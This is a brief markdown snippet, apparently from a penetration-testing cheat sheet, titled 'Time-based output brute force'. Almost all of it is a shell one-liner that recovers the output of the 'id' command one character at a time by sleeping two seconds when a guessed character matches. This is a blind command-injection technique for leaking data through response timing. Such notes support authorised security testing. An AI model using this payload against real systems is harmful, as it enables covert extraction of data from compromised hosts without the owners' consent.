# Time-based output brute force

`<N>` is character position. We brute force 1 by one

```sh
id | head -c <N> | tail -c 1 | { read c; if [ "$c" = "a" ]; then sleep 2; fi; }
```
